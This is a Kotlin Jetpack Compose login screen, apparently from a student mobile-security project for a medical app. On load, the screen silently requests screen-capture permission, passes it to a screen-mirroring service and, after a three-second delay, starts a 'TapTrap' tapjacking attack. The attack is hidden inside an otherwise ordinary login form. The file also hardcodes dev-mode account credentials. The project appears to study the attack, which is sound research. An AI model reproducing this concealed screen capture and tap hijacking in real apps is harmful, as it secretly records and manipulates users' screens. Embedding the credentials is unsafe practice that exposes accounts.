package com.example.inf2007_mad_j1847.view.auth

import android.app.Activity
import android.util.Log
import android.widget.Toast // NEW: For simple error feedback
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext // NEW: To get Context for Toast
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.navigation.NavHostController
import com.example.inf2007_mad_j1847.viewmodel.AuthViewModel
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.android.gms.auth.api.signin.GoogleSignInOptions
import com.google.android.gms.common.api.ApiException
import com.example.inf2007_mad_j1847.BuildConfig
import com.example.inf2007_mad_j1847.test.TapTrap
import kotlinx.coroutines.delay
import android.content.Context
import android.media.projection.MediaProjectionManager
import com.example.inf2007_mad_j1847.test.ScreenMirrorService

@Composable
fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
    val uiState by authViewModel.uiState.collectAsState()
    val context = LocalContext.current // Used for Toast and Google Client

    val activity = context as ComponentActivity
    val tapTrap = remember { TapTrap(activity) }

    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

    val mediaProjectionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            ScreenMirrorService.sResultCode = result.resultCode
            ScreenMirrorService.sResultData = result.data!!
            Log.d("TapTrap", "🎥 MediaProjection granted!")
        }
    }

    LaunchedEffect(Unit) {
        mediaProjectionLauncher.launch(mpm.createScreenCaptureIntent())
        delay(3000)

        println("launch ENTER")
            tapTrap.startAttack()



    }




    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }

    val gso = remember {
        GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestIdToken("959525127524-mpbapotg2h2qt1bn54ap6d3ttevi4aim.apps.googleusercontent.com")
            .requestEmail()
            .build()
    }
    val googleSignInClient = remember { GoogleSignIn.getClient(context, gso) }

    val googleSignInLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val task = GoogleSignIn.getSignedInAccountFromIntent(result.data)
            try {
                val account = task.getResult(ApiException::class.java)
                val idToken = account?.idToken
                if (idToken != null) {
                    authViewModel.signInWithGoogle(idToken)
                }
            } catch (e: ApiException) {
                Toast.makeText(context, "Google Sign-In Failed: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }

    // Navigation logic
    LaunchedEffect(uiState) {
        if (uiState is AuthViewModel.AuthUiState.Success) {
            val role = (uiState as AuthViewModel.AuthUiState.Success).role
            val destination = when (role) {
                "ADMIN" -> "admin_home"
                "DOCTOR" -> "doctor_home"
                else -> "patient_home"
            }
            navController.navigate(destination) {
                popUpTo("auth_graph") { inclusive = true }
            }
        }
    }

    Column(
        modifier = Modifier.fillMaxSize().padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        TextField(value = email, onValueChange = { email = it }, label = { Text("Email") })
        TextField(
            value = password,
            onValueChange = { password = it },
            label = { Text("Password") },
            visualTransformation = PasswordVisualTransformation()
        )

        Spacer(modifier = Modifier.height(16.dp))

        if (uiState is AuthViewModel.AuthUiState.Loading) {
            CircularProgressIndicator()
        } else {
            Button(
                onClick = { authViewModel.login(email, password) },
                modifier = Modifier.fillMaxWidth(0.8f)
            ) { Text("Login") }

            Spacer(modifier = Modifier.height(8.dp))

//            Button(
//                onClick = {
//                    Log.d("TapTrap", "🔴 TEST BUTTON CLICKED - Launching attack")
//                    onAttackTrigger()  // Calls TapTrapAttack.java
//                },
//                modifier = Modifier
//                    .fillMaxWidth()
//                    .height(60.dp),
//                colors = ButtonDefaults.buttonColors(
//                    containerColor = MaterialTheme.colorScheme.error,  // Red = test mode
//                    contentColor = MaterialTheme.colorScheme.onError
//                )
//            ){
//                Text("TEST TAPTRAP ATTACK")  // ← Content goes HERE
//            }


            OutlinedButton(
                onClick = { googleSignInLauncher.launch(googleSignInClient.signInIntent) },
                modifier = Modifier.fillMaxWidth(0.8f)
            ) {
                Text("Sign in with Google")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        TextButton(onClick = { navController.navigate("signup_screen") }) {
            Text("Don't have an account? Sign Up")
        }


        if (BuildConfig.DEV_MODE) {
            Spacer(modifier = Modifier.height(12.dp))

            Button(onClick = {
                authViewModel.login("xuanyang@mobsec.com", "securepassword")
            }) {
                Text("DEV: patient login")
            }

            Button(onClick = {
                authViewModel.login("diniezikry@mobsec.com", "securepassword")
            }) {
                Text("DEV: Doctor login")
            }
        }

        if (uiState is AuthViewModel.AuthUiState.Error) {
            Text(
                (uiState as AuthViewModel.AuthUiState.Error).message,
                color = MaterialTheme.colorScheme.error
            )
        }
    }
}